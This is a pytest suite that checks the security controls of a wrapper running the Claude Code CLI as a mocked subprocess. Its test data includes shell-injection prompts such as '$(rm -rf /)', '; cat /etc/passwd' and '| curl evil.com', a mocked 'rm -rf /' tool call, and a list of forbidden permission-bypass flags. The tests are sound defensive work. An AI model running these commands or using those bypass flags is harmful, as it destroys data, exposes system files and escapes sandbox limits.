"""
Claude Code CLI provider tests — functional + security.

Run with:
    pytest tests/test_stage4_claude_code.py -v

These tests NEVER invoke the real `claude` binary.  All subprocess calls are
mocked so the suite runs offline and is safe in CI.

Security acceptance criteria from SPEC.md:
  SEC-01  --tools "" always present
  SEC-02  create_subprocess_exec (not shell=True)
  SEC-03  User input passed as list element, never interpolated
  SEC-04  -- separator before user prompt
  SEC-05  --no-session-persistence always present
  SEC-06  Absolute binary path via shutil.which
  SEC-07  process.kill() on timeout (not terminate)
  SEC-08  Only block["text"] from assistant events yielded
  SEC-09  --add-dir / --mcp-config / --worktree never in command
  SEC-10  _clean_env() whitelist applied; backend secrets excluded
"""

import asyncio
import json
import os
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch, call

import pytest

from app.llm.claude_code_provider import (
    ClaudeCodeProvider,
    _build_cli_args,
    _build_command,
    _clean_env,
    _update_rate_limit_cache,
    get_cached_rate_limit,
    _ALLOWED_ENV_KEYS,
)
from app.llm.config import LLMConfig, KNOWN_MODELS
from app.llm.exceptions import LLMError
from app.llm.service import LLMService


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_config(**kwargs) -> LLMConfig:
    defaults = {
        "provider": "claude_code",
        "model": "sonnet",
        "api_key": "",
        "base_url": "",
        "temperature": 0.3,
        "max_tokens": 4096,
        "rate_limit_tpm": 0,
    }
    defaults.update(kwargs)
    return LLMConfig(**defaults)


def _ndjson_line(obj: dict) -> bytes:
    return (json.dumps(obj) + "\n").encode()


def _make_process(stdout_lines: list[bytes], returncode: int = 0):
    """Build a mock subprocess with a readable stdout."""
    proc = MagicMock()
    proc.returncode = returncode
    # stdout.readline() returns each line then b""
    proc.stdout = AsyncMock()
    proc.stdout.readline = AsyncMock(side_effect=stdout_lines + [b""])
    proc.stderr = AsyncMock()
    proc.stderr.read = AsyncMock(return_value=b"")
    proc.wait = AsyncMock()
    proc.kill = MagicMock()
    return proc


# ── _clean_env tests ──────────────────────────────────────────────────────────

class TestCleanEnv:
    """SEC-10: environment whitelist."""

    def test_only_allowed_keys_pass_through(self, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret")
        monkeypatch.setenv("DATABASE_URL", "sqlite:///prod.db")
        monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
        monkeypatch.setenv("SECRET_TOKEN", "top-secret")

        env = _clean_env()

        assert "ANTHROPIC_API_KEY" not in env, "API key must not leak to subprocess"
        assert "DATABASE_URL" not in env, "DB URL must not leak to subprocess"
        assert "OPENAI_API_KEY" not in env, "OpenAI key must not leak to subprocess"
        assert "SECRET_TOKEN" not in env, "arbitrary secret must not leak to subprocess"

        # Allowed keys that exist in the process env should pass through
        for key in env:
            assert key in _ALLOWED_ENV_KEYS, f"Unexpected key in clean env: {key}"

    def test_missing_allowed_keys_are_absent(self, monkeypatch):
        monkeypatch.delenv("XDG_RUNTIME_DIR", raising=False)
        env = _clean_env()
        assert "XDG_RUNTIME_DIR" not in env  # absent, not errored


# ── _build_cli_args tests ─────────────────────────────────────────────────────

class TestBuildCliArgs:
    def test_simple_user_only(self):
        messages = [{"role": "user", "content": "hello"}]
        system_prompt, user_prompt = _build_cli_args(messages)
        assert user_prompt == "hello"
        assert system_prompt == ""

    def test_system_extracted(self):
        messages = [
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": "hi"},
        ]
        system_prompt, user_prompt = _build_cli_args(messages)
        assert "You are a helpful assistant." in system_prompt
        assert user_prompt == "hi"

    def test_history_appended_to_system(self):
        messages = [
            {"role": "system", "content": "Be helpful."},
            {"role": "user", "content": "first question"},
            {"role": "assistant", "content": "first answer"},
            {"role": "user", "content": "second question"},
        ]
        system_prompt, user_prompt = _build_cli_args(messages)
        assert user_prompt == "second question"
        assert "first question" in system_prompt
        assert "first answer" in system_prompt
        assert "Conversation so far" in system_prompt

    def test_empty_messages_returns_empty_prompt(self):
        system_prompt, user_prompt = _build_cli_args([])
        assert user_prompt == ""

    def test_last_non_user_message_not_used_as_prompt(self):
        messages = [
            {"role": "user", "content": "q"},
            {"role": "assistant", "content": "a"},
        ]
        system_prompt, user_prompt = _build_cli_args(messages)
        # Last message is assistant, not user — so user_prompt stays empty
        assert user_prompt == ""


# ── _build_command tests (SEC-01, 02, 04, 05, 09) ─────────────────────────────

class TestBuildCommand:
    """Verify the command list contains required flags and no forbidden flags."""

    def test_contains_tools_empty_string(self):
        """SEC-01: --tools "" disables all tools."""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        tools_idx = cmd.index("--tools")
        assert cmd[tools_idx + 1] == "", "--tools must be followed by empty string"

    def test_contains_no_session_persistence(self):
        """SEC-05: no disk writes to ~/.claude/"""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        assert "--no-session-persistence" in cmd

    def test_separator_before_prompt(self):
        """SEC-04: -- before user prompt prevents flag injection."""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        sep_idx = cmd.index("--")
        assert cmd[sep_idx + 1] == "hello"

    def test_flag_injection_cannot_escape(self):
        """SEC-03 + SEC-04: malicious prompt cannot inject flags."""
        evil_prompt = "--tools bash --model haiku"
        cmd = _build_command("/usr/bin/claude", "sonnet", "", evil_prompt)
        # The evil string must appear exactly once, after the -- separator
        sep_idx = cmd.index("--")
        assert cmd[sep_idx + 1] == evil_prompt
        # Nothing before the separator should be the evil string
        assert evil_prompt not in cmd[:sep_idx]

    def test_no_add_dir_flag(self):
        """SEC-09: filesystem access flags forbidden."""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        assert "--add-dir" not in cmd

    def test_no_mcp_config_flag(self):
        """SEC-09: MCP config must not appear."""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        assert "--mcp-config" not in cmd

    def test_no_worktree_flag(self):
        """SEC-09: worktree flag must not appear."""
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        assert "--worktree" not in cmd

    def test_uses_provided_binary_path(self):
        """SEC-06: absolute path used as first element."""
        cmd = _build_command("/custom/path/claude", "sonnet", "", "hi")
        assert cmd[0] == "/custom/path/claude"

    def test_system_prompt_included_when_provided(self):
        cmd = _build_command("/usr/bin/claude", "sonnet", "sys", "hello")
        assert "--system-prompt" in cmd
        idx = cmd.index("--system-prompt")
        assert cmd[idx + 1] == "sys"

    def test_no_system_prompt_flag_when_empty(self):
        cmd = _build_command("/usr/bin/claude", "sonnet", "", "hello")
        assert "--system-prompt" not in cmd


# ── _stream_cli / ClaudeCodeProvider.stream — functional ─────────────────────

class TestStreamCli:
    """Functional streaming tests using mock subprocess."""

    @pytest.mark.asyncio
    async def test_yields_assistant_text(self):
        """Happy path: assistant text chunks are yielded."""
        stdout_lines = [
            _ndjson_line({"type": "system", "session_id": "abc123"}),
            _ndjson_line({"type": "assistant", "message": {
                "content": [{"type": "text", "text": "Hello, "}]
            }}),
            _ndjson_line({"type": "assistant", "message": {
                "content": [{"type": "text", "text": "world!"}]
            }}),
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc) as mock_exec, \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            chunks = []
            async for chunk in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert chunks == ["Hello, ", "world!"]

    @pytest.mark.asyncio
    async def test_non_text_blocks_not_yielded(self):
        """SEC-08: only type=text blocks from assistant events are yielded."""
        stdout_lines = [
            _ndjson_line({"type": "assistant", "message": {
                "content": [
                    {"type": "tool_use", "name": "bash", "input": {"command": "rm -rf /"}},
                    {"type": "text", "text": "safe text"},
                ]
            }}),
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            chunks = []
            async for chunk in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert chunks == ["safe text"]
        assert "rm -rf /" not in "".join(chunks)

    @pytest.mark.asyncio
    async def test_raw_lines_never_yielded(self):
        """SEC-08: raw JSON lines from stdout are never yielded."""
        raw_line = '{"type":"system","session_id":"abc"}\n'
        stdout_lines = [
            raw_line.encode(),
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            chunks = []
            async for chunk in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert not any("{" in c for c in chunks), "Raw JSON must never be yielded"

    @pytest.mark.asyncio
    async def test_malformed_json_skipped(self):
        """Malformed lines are logged and skipped, not raised."""
        stdout_lines = [
            b"not valid json\n",
            _ndjson_line({"type": "assistant", "message": {
                "content": [{"type": "text", "text": "ok"}]
            }}),
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            chunks = []
            async for chunk in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert chunks == ["ok"]

    @pytest.mark.asyncio
    async def test_error_result_raises_llm_error(self):
        """result event with is_error=True raises LLMError."""
        stdout_lines = [
            _ndjson_line({"type": "result", "is_error": True,
                          "result": "Something went wrong"}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            with pytest.raises(LLMError, match="Something went wrong"):
                async for _ in ClaudeCodeProvider.stream(
                    [{"role": "user", "content": "hi"}], cfg
                ):
                    pass

    @pytest.mark.asyncio
    async def test_rate_limit_error_raises_llm_error(self):
        """rate limit keywords in error result raise LLMError with clear message."""
        stdout_lines = [
            _ndjson_line({"type": "result", "is_error": True,
                          "result": "Claude Code usage limit reached for today"}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            with pytest.raises(LLMError, match="subscription limit"):
                async for _ in ClaudeCodeProvider.stream(
                    [{"role": "user", "content": "hi"}], cfg
                ):
                    pass

    @pytest.mark.asyncio
    async def test_timeout_kills_process(self):
        """SEC-07: asyncio.TimeoutError triggers process.kill() (not terminate)."""
        proc = MagicMock()
        proc.returncode = None
        proc.stdout = AsyncMock()
        proc.stdout.readline = AsyncMock(side_effect=asyncio.TimeoutError)
        proc.stderr = AsyncMock()
        proc.stderr.read = AsyncMock(return_value=b"")
        proc.wait = AsyncMock()
        proc.kill = MagicMock()
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"), \
             patch("app.llm.claude_code_provider.asyncio.timeout") as mock_timeout:
            # Make the context manager raise TimeoutError
            cm = MagicMock()
            cm.__aenter__ = AsyncMock(return_value=None)
            cm.__aexit__ = AsyncMock(side_effect=asyncio.TimeoutError)
            mock_timeout.return_value = cm

            with pytest.raises(LLMError, match="timed out"):
                async for _ in ClaudeCodeProvider.stream(
                    [{"role": "user", "content": "hi"}], cfg
                ):
                    pass

        proc.kill.assert_called_once()
        # Crucially: terminate must NOT have been used
        assert not hasattr(proc, "terminate") or not proc.terminate.called

    @pytest.mark.asyncio
    async def test_nonzero_exit_without_result_raises(self):
        """Non-zero exit code without a result event raises LLMError."""
        proc = _make_process([], returncode=1)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            with pytest.raises(LLMError, match="exited with code 1"):
                async for _ in ClaudeCodeProvider.stream(
                    [{"role": "user", "content": "hi"}], cfg
                ):
                    pass

    @pytest.mark.asyncio
    async def test_stderr_never_yielded(self):
        """SEC logging: stderr goes to logger, never to caller."""
        stdout_lines = [
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        proc.stderr.read = AsyncMock(return_value=b"some internal error details")
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc), \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            chunks = []
            async for chunk in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert not any("internal error" in c for c in chunks)


# ── SEC-02: subprocess spawning ───────────────────────────────────────────────

class TestSubprocessSpawning:
    """SEC-02: create_subprocess_exec, never shell=True."""

    @pytest.mark.asyncio
    async def test_uses_create_subprocess_exec_not_shell(self):
        stdout_lines = [
            _ndjson_line({"type": "result", "is_error": False}),
        ]
        proc = _make_process(stdout_lines)
        cfg = _make_config()

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc) as mock_exec, \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            async for _ in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                pass

        mock_exec.assert_called_once()
        # shell=True must never be in the kwargs
        call_kwargs = mock_exec.call_args.kwargs
        assert call_kwargs.get("shell") is not True, \
            "shell=True is forbidden — use create_subprocess_exec"

    @pytest.mark.asyncio
    async def test_clean_env_passed_to_subprocess(self):
        """SEC-10: sanitized env is passed, not os.environ directly."""
        stdout_lines = [_ndjson_line({"type": "result", "is_error": False})]
        proc = _make_process(stdout_lines)
        cfg = _make_config()
        expected_env = {"PATH": "/usr/bin"}

        with patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   return_value=proc) as mock_exec, \
             patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"), \
             patch("app.llm.claude_code_provider._clean_env",
                   return_value=expected_env):
            async for _ in ClaudeCodeProvider.stream(
                [{"role": "user", "content": "hi"}], cfg
            ):
                pass

        call_kwargs = mock_exec.call_args.kwargs
        assert call_kwargs.get("env") == expected_env


# ── Rate limit cache ──────────────────────────────────────────────────────────

class TestRateLimitCache:
    def test_cache_updated_from_event(self):
        import app.llm.claude_code_provider as mod
        mod._rate_limit_cache = None

        event = {
            "type": "rate_limit_event",
            "rate_limit_info": {
                "status": "rate_limited",
                "rateLimitType": "five_hour",
                "resetsAt": 1700000000,
            },
        }
        _update_rate_limit_cache(event)
        cache = get_cached_rate_limit()

        assert cache is not None
        assert cache["status"] == "rate_limited"
        assert cache["rate_limit_type"] == "five_hour"
        assert isinstance(cache["resets_at"], datetime)
        assert cache["resets_at"].tzinfo is not None

    def test_invalid_resets_at_handled_gracefully(self):
        event = {
            "type": "rate_limit_event",
            "rate_limit_info": {
                "status": "rate_limited",
                "resetsAt": 99999999999999,  # overflow timestamp
            },
        }
        # Should not raise
        _update_rate_limit_cache(event)
        cache = get_cached_rate_limit()
        assert cache["resets_at"] is None

    def test_missing_rate_limit_info_handled(self):
        event = {"type": "rate_limit_event"}
        _update_rate_limit_cache(event)
        cache = get_cached_rate_limit()
        assert cache["status"] is None


# ── ClaudeCodeProvider.check_available ───────────────────────────────────────

class TestCheckAvailable:
    @pytest.mark.asyncio
    async def test_returns_false_when_binary_missing(self):
        with patch("app.llm.claude_code_provider.shutil.which", return_value=None):
            ok, msg = await ClaudeCodeProvider.check_available()
        assert ok is False
        assert "not found" in msg.lower()

    @pytest.mark.asyncio
    async def test_returns_true_on_authenticated_cli(self):
        version_proc = MagicMock()
        version_proc.communicate = AsyncMock(return_value=(b"1.0.0\n", b""))
        version_proc.returncode = 0

        auth_result = json.dumps({"is_error": False, "result": "ok"}).encode()
        auth_proc = MagicMock()
        auth_proc.communicate = AsyncMock(return_value=(auth_result, b""))
        auth_proc.returncode = 0

        with patch("app.llm.claude_code_provider.shutil.which",
                   return_value="/usr/bin/claude"), \
             patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   side_effect=[version_proc, auth_proc]):
            ok, msg = await ClaudeCodeProvider.check_available()

        assert ok is True
        assert "1.0.0" in msg

    @pytest.mark.asyncio
    async def test_returns_false_on_auth_error(self):
        version_proc = MagicMock()
        version_proc.communicate = AsyncMock(return_value=(b"1.0.0\n", b""))
        version_proc.returncode = 0

        auth_result = json.dumps({
            "is_error": True,
            "result": "Not authenticated, please run claude auth login",
        }).encode()
        auth_proc = MagicMock()
        auth_proc.communicate = AsyncMock(return_value=(auth_result, b""))
        auth_proc.returncode = 1

        with patch("app.llm.claude_code_provider.shutil.which",
                   return_value="/usr/bin/claude"), \
             patch("app.llm.claude_code_provider.asyncio.create_subprocess_exec",
                   side_effect=[version_proc, auth_proc]):
            ok, msg = await ClaudeCodeProvider.check_available()

        assert ok is False
        assert "authenticated" in msg.lower()


# ── LLMService routing ────────────────────────────────────────────────────────

class TestLLMServiceRouting:
    """Verify LLMService correctly routes claude_code to ClaudeCodeProvider."""

    @pytest.mark.asyncio
    async def test_chat_completion_routes_to_claude_code(self):
        """chat_completion uses ClaudeCodeProvider.stream for claude_code provider."""
        cfg = _make_config()
        service = LLMService()

        async def fake_stream(messages, config):
            yield "chunk1"
            yield "chunk2"

        with patch.object(ClaudeCodeProvider, "stream", side_effect=fake_stream):
            chunks = []
            async for chunk in service.chat_completion(
                [{"role": "user", "content": "hi"}], cfg
            ):
                chunks.append(chunk)

        assert chunks == ["chunk1", "chunk2"]

    @pytest.mark.asyncio
    async def test_chat_completion_sync_routes_to_claude_code(self):
        """chat_completion_sync collects chunks into full string."""
        cfg = _make_config()
        service = LLMService()

        async def fake_stream(messages, config):
            yield "Hello, "
            yield "world!"

        with patch.object(ClaudeCodeProvider, "stream", side_effect=fake_stream):
            result = await service.chat_completion_sync(
                [{"role": "user", "content": "hi"}], cfg
            )

        assert result == "Hello, world!"

    @pytest.mark.asyncio
    async def test_test_connection_uses_check_available(self):
        """test_connection uses check_available, not a live prompt."""
        cfg = _make_config()
        service = LLMService()

        with patch.object(ClaudeCodeProvider, "check_available",
                          new=AsyncMock(return_value=(True, "1.0.0"))):
            result = await service.test_connection(cfg)

        assert result is True

    @pytest.mark.asyncio
    async def test_test_connection_raises_on_failure(self):
        """test_connection raises LLMError when check_available returns False."""
        cfg = _make_config()
        service = LLMService()

        with patch.object(ClaudeCodeProvider, "check_available",
                          new=AsyncMock(return_value=(False, "Not authenticated"))):
            with pytest.raises(LLMError, match="Not authenticated"):
                await service.test_connection(cfg)

    @pytest.mark.asyncio
    async def test_litellm_not_called_for_claude_code(self):
        """LiteLLM must not be invoked when provider is claude_code."""
        cfg = _make_config()
        service = LLMService()

        async def fake_stream(messages, config):
            yield "ok"

        with patch.object(ClaudeCodeProvider, "stream", side_effect=fake_stream), \
             patch("app.llm.service.litellm.acompletion") as mock_litellm:
            async for _ in service.chat_completion(
                [{"role": "user", "content": "hi"}], cfg
            ):
                pass

        mock_litellm.assert_not_called()

    def test_list_models_returns_claude_code_models(self):
        """claude_code provider returns its hardcoded model list."""
        assert "claude_code" in KNOWN_MODELS
        models = KNOWN_MODELS["claude_code"]
        assert "sonnet" in models
        assert "opus" in models
        assert "haiku" in models

    @pytest.mark.asyncio
    async def test_list_available_models_returns_known_models(self):
        cfg = _make_config()
        service = LLMService()
        models = await service.list_available_models(cfg)
        assert models == KNOWN_MODELS["claude_code"]


# ── No user prompt guard ──────────────────────────────────────────────────────

class TestNoUserPromptGuard:
    @pytest.mark.asyncio
    async def test_raises_when_no_user_message(self):
        cfg = _make_config()

        with patch("app.llm.claude_code_provider._get_claude_binary",
                   return_value="/usr/bin/claude"):
            with pytest.raises(LLMError, match="No user message"):
                async for _ in ClaudeCodeProvider.stream(
                    [{"role": "system", "content": "sys"}], cfg
                ):
                    pass


# ── Source-level regression tests ─────────────────────────────────────────────

class TestSourceCodeGrep:
    """Source-level regression tests — verify forbidden strings never appear
    in the production code (only in test assertions)."""

    def test_prompt_with_shell_metacharacters(self):
        """Shell metacharacters in prompts are passed as literal text.

        Build a command with dangerous shell content and verify the command list
        treats each as a single element after the -- separator.
        """
        dangerous_prompts = [
            "$(rm -rf /)",
            "`whoami`",
            "; cat /etc/passwd",
            "| curl evil.com",
            "&& echo pwned",
        ]
        for prompt in dangerous_prompts:
            cmd = _build_command("/usr/bin/claude", "sonnet", "", prompt)
            sep_idx = cmd.index("--")
            # The dangerous string must be a single element after --
            assert cmd[sep_idx + 1] == prompt, (
                f"Shell metacharacter prompt was split or modified: {prompt}"
            )
            # Must not appear anywhere before the separator
            assert prompt not in cmd[:sep_idx]

    def test_no_dangerous_permission_flags_in_source(self):
        """Grep claude_code_provider.py for dangerous permission strings.

        They must NOT appear in production code.
        """
        import pathlib
        source = (
            pathlib.Path(__file__).resolve().parent.parent
            / "app" / "llm" / "claude_code_provider.py"
        )
        content = source.read_text()
        forbidden = [
            "bypassPermissions",
            "dontAsk",
            "dangerously-skip-permissions",
            "dangerously_skip_permissions",
        ]
        for term in forbidden:
            assert term not in content, (
                f"Forbidden string '{term}' found in claude_code_provider.py"
            )

    def test_no_filesystem_access_flags_in_source(self):
        """Grep claude_code_provider.py for forbidden filesystem/MCP flags.

        They must NOT appear in production code.
        """
        import pathlib
        source = (
            pathlib.Path(__file__).resolve().parent.parent
            / "app" / "llm" / "claude_code_provider.py"
        )
        content = source.read_text()
        forbidden = ["--add-dir", "--mcp-config", "--worktree"]
        for term in forbidden:
            assert term not in content, (
                f"Forbidden flag '{term}' found in claude_code_provider.py"
            )
